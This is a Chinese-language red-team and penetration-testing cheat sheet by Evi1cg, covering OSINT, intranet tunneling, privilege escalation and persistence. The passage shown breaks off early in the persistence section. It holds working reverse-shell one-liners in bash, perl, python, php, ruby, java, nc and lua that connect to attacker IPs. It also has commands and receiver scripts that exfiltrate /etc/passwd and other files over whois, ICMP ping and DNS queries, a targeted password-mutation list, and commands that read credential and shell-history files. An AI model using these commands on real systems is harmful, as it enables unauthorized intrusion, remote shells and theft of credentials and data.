 Author: [Evi1cg](https://twitter.com/Evi1cg) 
 Blog: https://evi1cg.github.io


Table of Contents
=================

  * [信息搜集](#信息搜集)
      * [开源情报信息收集（OSINT）](#开源情报信息收集osint)
        * [github](#github)
        * [whois查询/注册人反查/邮箱反查/相关资产](#whois查询注册人反查邮箱反查相关资产)
        * [google hacking](#google-hacking)
      * [创建企业密码字典](#创建企业密码字典)
        * [字典列表](#字典列表)
        * [密码生成](#密码生成)
        * [邮箱列表获取](#邮箱列表获取)
        * [泄露密码查询](#泄露密码查询)
        * [对企业外部相关信息进行搜集](#对企业外部相关信息进行搜集)
            * [子域名获取](#子域名获取)
  * [进入内网](#进入内网)
      * [基于企业弱账号漏洞](#基于企业弱账号漏洞)
      * [基于系统漏洞进入](#基于系统漏洞进入)
      * [网站应用程序渗透](#网站应用程序渗透)
      * [无线Wi-Fi接入](#无线wi-fi接入)
  * [隐匿攻击](#隐匿攻击)
      * [Command and Control](#command-and-control)
      * [Fronting](#fronting)
      * [代理](#代理)
  * [内网跨边界应用](#内网跨边界应用)
      * [内网跨边界转发](#内网跨边界转发)
      * [内网跨边界代理穿透](#内网跨边界代理穿透)
        * [<a href="https://rootkiter.com/EarthWorm/" rel="nofollow">EW</a>](#ew)
        * [<a href="https://rootkiter.com/Termite/" rel="nofollow">Termite</a>](#termite)
        * [代理脚本](#代理脚本)
      * [shell反弹](#shell反弹)
      * [内网文件的传输和下载](#内网文件的传输和下载)
      * [搭建 HTTP server](#搭建-http-server)
  * [内网信息搜集](#内网信息搜集)
      * [本机信息搜集](#本机信息搜集)
        * [1、用户列表](#1用户列表)
        * [2、进程列表](#2进程列表)
        * [3、服务列表](#3服务列表)
        * [4、端口列表](#4端口列表)
        * [5、补丁列表](#5补丁列表)
        * [6、本机共享](#6本机共享)
        * [7、本用户习惯分析](#7本用户习惯分析)
        * [8、获取当前用户密码工具](#8获取当前用户密码工具)
            * [Windows](#windows)
            * [Linux](#linux)
      * [扩散信息收集](#扩散信息收集)
        * [端口扫描](#端口扫描)
            * [常用端口扫描工具](#常用端口扫描工具)
        * [内网拓扑架构分析](#内网拓扑架构分析)
        * [常见信息收集命令](#常见信息收集命令)
      * [第三方信息收集](#第三方信息收集)
  * [权限提升](#权限提升)
      * [Windows](#windows-1)
        * [BypassUAC](#bypassuac)
            * [常用方法](#常用方法)
            * [常用工具](#常用工具)
        * [提权](#提权)
      * [Linux](#linux-1)
        * [内核溢出提权](#内核溢出提权)
        * [计划任务](#计划任务)
        * [SUID](#suid)
        * [系统服务的错误权限配置漏洞](#系统服务的错误权限配置漏洞)
        * [不安全的文件/文件夹权限配置](#不安全的文件文件夹权限配置)
        * [找存储的明文用户名，密码](#找存储的明文用户名密码)
  * [权限维持](#权限维持)
      * [系统后门](#系统后门)
        * [Windows](#windows-2)
            * [1、密码记录工具](#1密码记录工具)
            * [2、常用的存储Payload位置](#2常用的存储payload位置)
            * [3、Run/RunOnce Keys](#3runrunonce-keys)
            * [4、BootExecute Key](#4bootexecute-key)
            * [5、Userinit Key](#5userinit-key)
            * [6、Startup Keys](#6startup-keys)
            * [7、Services](#7services)
            * [8、Browser Helper Objects](#8browser-helper-objects)
            * [9、AppInit_DLLs](#9appinit_dlls)
            * [10、文件关联](#10文件关联)
            * [11、<a href="http://www.liuhaihua.cn/archives/357579.html" rel="nofollow">bitsadmin</a>](#11bitsadmin)
            * [12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html" rel="nofollow">mof </a>](#12mof-)
            * [13、<a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe" rel="nofollow">wmi</a>](#13wmi)
            * [14、<a href="https://3gstudent.github.io/Userland-registry-hijacking" rel="nofollow">Userland Persistence With Scheduled Tasks</a>](#14userland-persistence-with-scheduled-tasks)
            * [15、<a href="https://3gstudent.github.io/Netsh-persistence" rel="nofollow">Netsh</a>](#15netsh)
            * [16、<a href="https://3gstudent.github.io/渗透测试中的Application-Compatibility-Shims" rel="nofollow">Shim</a>](#16shim)
            * [17、<a href="https://3gstudent.github.io/DLL劫持漏洞自动化识别工具Rattler测试" rel="nofollow">DLL劫持</a>](#17dll劫持)
            * [18、<a href="https://3gstudent.github.io/渗透测试中的Application-Verifier(DoubleAgent利用介绍)" rel="nofollow">DoubleAgent </a>](#18doubleagent-)
            * [19、<a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence" rel="nofollow">waitfor.exe </a>](#19waitforexe-)
            * [20、<a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence" rel="nofollow">AppDomainManager</a>](#20appdomainmanager)
            * [21、Office](#21office)
            * [22、<a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence" rel="nofollow">CLR</a>](#22clr)
            * [23、<a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence" rel="nofollow">msdtc</a>](#23msdtc)
            * [24、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" rel="nofollow">Hijack CAccPropServicesClass and MMDeviceEnumerato</a>](#24hijack-caccpropservicesclass-and-mmdeviceenumerato)
            * [25、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe" rel="nofollow">Hijack explorer.exe</a>](#25hijack-explorerexe)
            * [26、Windows FAX DLL Injection](#26windows-fax-dll-injection)
            * [27、特殊注册表键值](#27特殊注册表键值)
            * [28、快捷方式后门](#28快捷方式后门)
            * [29、<a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence" rel="nofollow">Logon Scripts</a>](#29logon-scripts)
            * [30、<a href="https://3gstudent.github.io/Password-Filter-DLL在渗透测试中的应用" rel="nofollow">Password Filter DLL</a>](#30password-filter-dll)
            * [31、<a href="https://3gstudent.github.io/利用BHO实现IE浏览器劫持" rel="nofollow">利用BHO实现IE浏览器劫持</a>](#31利用bho实现ie浏览器劫持)
        * [Linux](#linux-2)
            * [crontab](#crontab)
            * [硬链接sshd](#硬链接sshd)
            * [SSH Server wrapper](#ssh-server-wrapper)
            * [SSH keylogger](#ssh-keylogger)
            * [Cymothoa_进程注入backdoor](#cymothoa_进程注入backdoor)
            * [rootkit](#rootkit)
            * [Tools](#tools)
      * [WEB后门](#web后门)
  * [横向渗透](#横向渗透)
      * [端口渗透](#端口渗透)
        * [端口扫描](#端口扫描-1)
        * [端口爆破](#端口爆破)
        * [端口弱口令](#端口弱口令)
        * [端口溢出](#端口溢出)
        * [常见的默认端口](#常见的默认端口)
            * [1、web类(web漏洞/敏感目录)](#1web类web漏洞敏感目录)
            * [2、数据库类(扫描弱口令)](#2数据库类扫描弱口令)
            * [3、特殊服务类(未授权/命令执行类/漏洞)](#3特殊服务类未授权命令执行类漏洞)
            * [4、常用端口类(扫描弱口令/端口爆破)](#4常用端口类扫描弱口令端口爆破)
            * [5、端口合计所对应的服务](#5端口合计所对应的服务)
      * [域渗透](#域渗透)
        * [信息搜集](#信息搜集-1)
            * [powerview.ps1](#powerviewps1)
            * [BloodHound](#bloodhound)
            * [获取域内DNS信息](#获取域内dns信息)
        * [获取域控的方法](#获取域控的方法)
            * [SYSVOL](#sysvol)
            * [MS14-068 Kerberos](#ms14-068-kerberos)
            * [SPN扫描](#spn扫描)
            * [Kerberos的黄金门票](#kerberos的黄金门票)
            * [Kerberos的银票务](#kerberos的银票务)
            * [域服务账号破解](#域服务账号破解)
            * [凭证盗窃](#凭证盗窃)
            * [NTLM relay](#ntlm-relay)
            * [Kerberos委派](#kerberos委派)
            * [地址解析协议](#地址解析协议)
            * [Zerologon](#ZeroLogon)
        * [获取AD哈希](#获取ad哈希)
        * [AD持久化](#ad持久化)
            * [活动目录持久性技巧](#活动目录持久性技巧)
            * [Security Support Provider](#security-support-provider)
            * [<a href="https://adsecurity.org/?p=1772" rel="nofollow">SID History</a>](#sid-history)
            * [<a href="https://adsecurity.org/?p=1906" rel="nofollow">AdminSDHolder＆SDProp </a>](#adminsdholdersdprop-)
            * [组策略](#组策略)
            * [Hook PasswordChangeNotify](#hook-passwordchangenotify)
            * [Kerberoasting后门](#kerberoasting后门)
            * [AdminSDHolder](#adminsdholder)
            * [Delegation](#delegation)
        * [其他](#其他)
            * [域内主机提权](#域内主机提权)
            * [Exchange的利用](#exchange的利用)
        * [TIPS](#tips)
        * [相关工具](#相关工具)
      * [在远程系统上执行程序](#在远程系统上执行程序)
      * [IOT相关](#iot相关)
      * [中间人](#中间人)
      * [规避杀软及检测](#规避杀软及检测)
        * [Bypass Applocker](#bypass-applocker)
        * [bypassAV](#bypassav)
  * [痕迹清理](#痕迹清理)
      * [<a href="https://3gstudent.github.io/渗透技巧-Windows日志的删除与绕过" rel="nofollow">Windows日志清除</a>](#windows日志清除)
      * [破坏Windows日志记录功能](#破坏windows日志记录功能)
      * [Metasploit](#Metasploit)
      * [3389登陆记录清除](#3389登陆记录清除)


## 信息搜集 
### 开源情报信息收集（OSINT） 
#### github 
* Github_Nuggests（自动爬取Github上文件敏感信息泄露） :https://github.com/az0ne/Github_Nuggests
* GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :https://github.com/FeeiCN/GSIL
* x-patrol(小米团队的):https://github.com/MiSecurity/x-patrol

#### whois查询/注册人反查/邮箱反查/相关资产

* 站长之家:http://whois.chinaz.com/?DomainName=target.com&ws=
* 爱站:https://whois.aizhan.com/target.com/
* 微步在线:https://x.threatbook.cn/
* IP反查:https://dns.aizhan.com/
* 天眼查:https://www.tianyancha.com/
* 虎妈查:http://www.whomx.com/
* 历史漏洞查询 :
    * 在线查询:http://wy.zone.ci/
    * 自搭建:https://github.com/hanc00l/wooyun_publi/

#### google hacking 

### 创建企业密码字典 
#### 字典列表 
* passwordlist:https://github.com/lavalamp-/password-lists
* 猪猪侠字典:https://pan.baidu.com/s/1dFJyedz
[Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） 
* 针对特定的厂商，重点构造厂商相关域名的字典
```
['%pwd%123','%user%123','%user%521','%user%2017','%pwd%321','%pwd%521','%user%321','%pwd%123!','%pwd%123!@#','%pwd%1234','%user%2016','%user%123$%^','%user%123!@#','%pwd%2016','%pwd%2017','%pwd%1!','%pwd%2@','%pwd%3#','%pwd%123#@!','%pwd%12345','%pwd%123$%^','%pwd%!@#456','%pwd%123qwe','%pwd%qwe123','%pwd%qwe','%pwd%123456','%user%123#@!','%user%!@#456','%user%1234','%user%12345','%user%123456','%user%123!']
```

#### 密码生成 

* GenpAss（中国特色的弱口令生成器: https://github.com/RicterZ/genpAss/
* passmaker（可以自定义规则的密码字典生成器） ：https://github.com/bit4woo/passmaker
* pydictor（强大的密码生成器） ：https://github.com/LandGrey/pydictor

#### 邮箱列表获取  

* theHarvester ：https://github.com/laramies/theHarvester
* 获取一个邮箱以后导出通讯录 
* LinkedInt :https://github.com/mdsecactivebreach/LinkedInt
* Mailget：https://github.com/Ridter/Mailget

#### 泄露密码查询
* ghostproject: https://ghostproject.fr/
* pwndb: https://pwndb2am4tzkvold.onion.to/

#### 对企业外部相关信息进行搜集
##### 子域名获取 
* Layer子域名挖掘机4.2纪念版 
* subDomainsBrute ：https://github.com/lijiejie/subDomainsBrute
* wydomain ：https://github.com/ring04h/wydomain
* Sublist3r ：https://github.com/aboul3la/Sublist3r
* 企查查：https://www.qcc.com/
* 天眼查：https://www.tianyancha.com/
* site:target.com:https://www.google.com
* Github代码仓库 
* 抓包分析请求返回值(跳转/文件上传/app/api接口等) 
* 站长帮手links等在线查询网站 
* 域传送漏洞 

>Linux
```
dig @ns.example.com example=.com AXFR 
```
>Windows
```
nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
nslookup #进入nslookup交互模式
server dns.domian.com #指定dns服务器
ls xxx.yyy.cn #列出域信息
```

* GetDomainsBySSL.py :https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/
* censys.io证书 :https://censys.io/certificates?q=target.com
* crt.sh证书查询:https://crt.sh/?q=%25.target.com
* shadon :https://www.shodan.io/
* zoomeye :https://www.zoomeye.org/
* fofa :https://fofa.so/
* censys：https://censys.io/
* dnsdb.io :https://dnsdb.io/zh-cn/search?q=target.com
* api.hackertarget.com :http://api.hackertarget.com/reversedns/?q=target.com
* community.riskiq.com :https://community.riskiq.com/Search/target.com
* subdomain3 :https://github.com/yanxiu0614/subdomain3
* FuzzDomain :https://github.com/Chora10/FuzzDomain
* dnsdumpster.com :https://dnsdumpster.com/
* phpinfo.me :https://phpinfo.me/domain/
* dns开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com

## 进入内网 

### 基于企业弱账号漏洞 

* VPN（通过邮箱，密码爆破，社工等途径获取VPN） 
* 企业相关运维系统（zabbix等） 

### 基于系统漏洞进入 
* Metasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework 
* 漏洞利用脚本 

### 网站应用程序渗透 
* SQL注入 
* 跨站脚本（XSS） 
* 跨站请求伪造（CSRF） 
* SSRF（[ssrf_proxy](https://github.com/bcoles/ssrf_proxy)） 
* 功能/业务逻辑漏洞 
* 其他漏洞等 
* CMS-内容管理系统漏洞 
* 企业自建代理 

### 无线Wi-Fi接入 

## 隐匿攻击 

### Command and Control  
* ICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/
* DNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/
* DropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/
* Gmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/
* Telegram :http://drops.xmd5.com/static/drops/tips-16142.html
* Twitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/
* Website Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/
* PowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/
* Windows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/
* WebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/
* Office 365 :https://www.anquanke.com/post/id/86974
* HTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/
* Kernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/
* Website :https://pentestlab.blog/2017/11/14/command-and-control-website/
* WMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/
* WebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/
* Images :https://pentestlab.blog/2018/01/02/command-and-control-images/
* Web Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/
* JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/
*  ... 

### Fronting 
* [Domain Fronting ](https://evi1cg.me/archives/Domain_Fronting.html)
* [Tor_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
  
### 代理 
* VPN 
* shadowsockts :https://github.com/shadowsocks
* HTTP :http://cn-proxy.com/
* Tor 

## 内网跨边界应用 

### 内网跨边界转发 
* [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555) 
* [LCX端口转发 ](http://blog.chinaunix.net/uid-53401-id-4407931.html)
* [nps](https://github.com/cnlh/nps) -> 个人用觉得比较稳定 ～
* [frp](https://github.com/fatedier/frp)
* 代理脚本 
    1. [Tunna ](https://github.com/SECFORCE/Tunna)
    2. [Reduh ](https://github.com/sensepost/reDuh)
* ... 
  
### 内网跨边界代理穿透 
#### [EW](https://rootkiter.com/EarthWorm/) 
正向 SOCKS v5 服务器:
```
./ew -s ssocksd -l 1080
```
 反弹 SOCKS v5 服务器:
a) 先在一台具有公网 ip 的主机A上运行以下命令：
```
$ ./ew -s rcsocks -l 1080 -e 8888 

```
b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
```
$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
```
多级级联
```
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
```
lcx_tran 的用法
```
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
```
lcx_listen、lcx_slave 的用法
```
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
```
“三级级联”的本地SOCKS测试用例以供参考
```
$ ./ew -s rcsocks -l 1080 -e 8888
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
$ ./ew -s lcx_listen -l 9999 -e 7777
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
```
#### [Termite](https://rootkiter.com/Termite/) 
使用说明:https://rootkiter.com/Termite/README.txt 
#### 代理脚本 
reGeorg :https://github.com/sensepost/reGeorg
Neo-reGeorg:https://github.com/L-codes/Neo-reGeorg
pystinger(毒刺):https://github.com/FunnyWolf/pystinger
ABPTTS:https://github.com/nccgroup/ABPTTS

### shell反弹 
bash  
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
perl 
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
python 
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
php 
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
ruby 
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
java 
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
nc 
```
#使用-e 
nc -e /bin/sh 223.8.200.234 1234 
```
```
#不使用-e
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe
```

lua 
```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 内网文件的传输和下载   
wput 
```
wput dir_name ftp://linuxpig:123456@host.com/
```
wget 
```
wget http://site.com/1.rar -O 1.rar
```
ariac2（需安装） 
```
aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
```
powershell
```
$p = New-Object System.Net.WebClient 
$p.DownloadFile("http://domain/file","C:%homepath%file") 
```
vbs脚本 
```
Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
.type = 1 '
.open
.write xHttp.responseBody
.savetofile " C:\%homepath%\file", 2 '
end with
```
>执行 ：cscript test.vbs

Perl 
```
#!/usr/bin/perl 
use LWP::Simple; 
getstore("http://domain/file", "file");
```
>执行：perl test.pl

Python 
```
#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen('http://domain/file') 
localFile = open('local_file', 'w') 
localFile.write(u.read()) 
localFile.close()
```
>执行：python test.py

Ruby 
```
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
```
>执行：ruby test.rb

PHP 
```
<?php
$url  = 'http://www.example.com/file';
$path = '/path/to/file';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
file_put_contents($path, $data);
?>
```
>执行：php test.php

NC 
attacker 
```
cat file | nc -l 1234
```
target
```
nc host_ip 1234 > file
```
FTP
```
ftp 127.0.0.1 username password get file exit
```
TFTP 
```
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```
Bitsadmin 
```
bitsadmin /transfer n http://domain/file c:%homepath%file
```
Window 文件共享 
```
net use x: \127.0.0.1\share /user:example.comuserID myPassword
```
SCP 
本地到远程 
```
scp file user@host.com:/tmp
```
远程到本地 
```
scp user@host.com:/tmp file
```
rsync 
远程rsync服务器中拷贝文件到本地机 
```
rsync -av root@192.168.78.192::www /databack
```
本地机器拷贝文件到远程rsync服务器 
```
rsync -av /databack root@192.168.78.192::www
```
certutil.exe 
```
certutil.exe -urlcache -split -f http://site.com/file
```
copy
```
copy \\IP\ShareName\file.exe file.exe
```
WHOIS
接收端 Host B：
```
nc -vlnp 1337 | sed "s/ //g" | base64 -d 
```
发送端 Host A：
```
whois -h host_ip -p 1337 `cat /etc/passwd | base64`
```

[WHOIS + TAR](https://twitter.com/mubix/status/1102780436118409216)
First:  
```
ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
```

Next
```
tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
```

Finally
```
cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
```

PING
发送端:
```
xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
```
接收端`ping_receiver.py`:
```
import sys

try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")
    sys.exit(0)


def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="eth0", prn=process_packet)
```
```
python3 ping_receiver.py
```

DIG
发送端:
```
xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
```
接收端`dns_reciver.py`:
```
try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")

def process_packet(pkt):
    if pkt.haslayer(DNS):
        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
        root_domain = domain.split('.')[1]
        if root_domain.startswith('gooogle'):
            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')

sniff(iface="eth0", prn=process_packet)
```
```
python3 dns_reciver.py
```
... 
### 搭建 HTTP server
python2
```
python -m SimpleHTTPServer 1337
```
python3
```
python -m http.server 1337
```
PHP 5.4+
```
php -S 0.0.0.0:1337
```
ruby
```
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
```
```
ruby -run -e httpd . -p 1337
```
Perl
```
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
```
```
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
```
busybox httpd
```
busybox httpd -f -p 8000
```



## 内网信息搜集 

### 本机信息搜集
#### 1、用户列表
windows用户列表 
分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 

#### 2、进程列表
析杀毒软件/安全监控工具等 
邮件客户端 
VPN 
ftp等  

#### 3、服务列表 
与安全防范工具有关服务[判断是否可以手动开关等]
存在问题的服务[权限/漏洞]

#### 4、端口列表
开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]
利用端口进行信息收集

#### 5、补丁列表
分析 Windows 补丁
第三方软件[Java/Oracle/Flash 等]漏洞

#### 6、本机共享
本机共享列表/访问权限
本机访问的域共享/访问权限

#### 7、本用户习惯分析 
历史记录 
收藏夹 
文档等 

#### 8、获取当前用户密码工具 

##### Windows
* [mimikatz](https://github.com/gentilkiwi/mimikatz)  
* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64)  
* [Invoke-WCMDump  ](https://github.com/peewpw/Invoke-WCMDump)
* [mimiDbg  ](https://github.com/giMini/mimiDbg)
* [LaZagne](https://github.com/AlessandroZ/LaZagne)
* [nirsoft_package](http://launcher.nirsoft.net/downloads/)
* [QuarksPwDump](https://github.com/quarkslab/quarkspwdump) [fgdump](https://github.com/mcandre/fgdump)
* 星号查看器等
  
##### Linux
* [LaZagne](https://github.com/AlessandroZ/LaZagne)  
* [mimipenguin](https://github.com/huntergregal/mimipenguin)

##### 浏览器
* [HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
* [SharpWeb](https://github.com/djhohnstein/SharpWeb)
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
* [360SafeBrowsergetpass](https://github.com/hayasec/360SafeBrowsergetpass)

##### 其他
* [SharpDecryptPwd](https://github.com/RcoIl/SharpDecryptPwd)
* [Decrypt_Weblogic_Password](https://github.com/TideSec/Decrypt_Weblogic_Password)
* [OA-Seeyou](https://github.com/jas502n/OA-Seeyou)

### 扩散信息收集 
#### 端口扫描 
##### 常用端口扫描工具 
* [nmap](https://nmap.org/) 
* [masscan](https://github.com/robertdavidgraham/masscan) 
*  [zmap](https://github.com/zmap/zmap)
* s扫描器 
* 自写脚本等 
* NC 
* ...

#### 内网拓扑架构分析
* DMZ
* 管理网
* 生产网
* 测试网

#### 常见信息收集命令 
ipconfig:
```
ipconfig /all ------> 查询本机 IP 段，所在域等
```
net:
```
net user ------> 本机用户列表
net localgroup administrators ------> 本机管理员[通常含有域用户]
net user /domain ------> 查询域用户
net group /domain ------> 查询域里面的工作组
net group "domain admins" /domain ------> 查询域管理员用户组
net localgroup administrators /domain ------> 登录本机的域管理员
net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 net group "Domain controllers" -------> 查看域控制器(如果有多台)
net view ------> 查询同一域内机器列表 net view /domain ------> 查询域列表
net view /domain:domainname
```
dsquery 
```
dsquery computer domainroot -limit 65535 && net group "domain
computers" /domain ------> 列出该域内所有机器名
dsquery user domainroot -limit 65535 && net user /domain------>列出该域内所有用户名
dsquery subnet ------>列出该域内网段划分
dsquery group && net group /domain ------>列出该域内分组 
dsquery ou ------>列出该域内组织单位 
dsquery server && net time /domain------>列出该域内域控制器 
```

### 第三方信息收集 
* NETBIOS 信息收集 
* SMB 信息收集  
* 空会话信息收集  
* 漏洞信息收集等 

## 权限提升 

### Windows 
#### BypassUAC 
##### 常用方法 
* 使用IFileOperation COM接口
* 使用Wusa.exe的extract选项
* 远程注入SHELLCODE 到傀儡进程
* DLL劫持，劫持系统的DLL文件
* eventvwr.exe and registry hijacking
* sdclt.exe
* SilentCleanup
* wscript.exe
* cmstp.exe
* 修改环境变量，劫持高权限.Net程序
* 修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序
* 直接提权过UAC

##### 常用工具 

* [UACME ](https://github.com/hfiref0x/UACME)
* [Bypass-UAC ](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
* [Yamabiko ](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko)
* ... 

#### 提权 
* windows内核漏洞提权
>检测类:[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester),[WinSystemHelper](https://github.com/brianwrf/WinSystemHelper),[wesng](https://github.com/bitsadmin/wesng)

>利用类:[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)，[BeRoot](https://github.com/AlessandroZ/BeRoot.git)

* 服务提权 
>数据库服务，ftp服务等

* WINDOWS错误系统配置 
* 系统服务的错误权限配置漏洞 
* 不安全的注册表权限配置 
* 不安全的文件/文件夹权限配置 
* 计划任务 
* 任意用户以NT AUTHORITY\SYSTEM权限安装msi 
* 提权脚本 
>[PowerUP](https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1),[ElevateKit](https://github.com/rsmudge/ElevateKit)

### Linux 
#### 内核溢出提权 
[linux-kernel-exploits ](https://github.com/SecWiki/linux-kernel-exploits)
#### 计划任务 
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
#### SUID 
```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```
寻找可利用bin：https://gtfobins.github.io/
#### 系统服务的错误权限配置漏洞 
```
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

#### 不安全的文件/文件夹权限配置 
```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```
#### 找存储的明文用户名，密码 
```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
```

## 权限维持 

### 系统后门 
#### Windows 
##### 1、密码记录工具 
WinlogonHack 
WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。
键盘记录器 
安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。
NTPass 
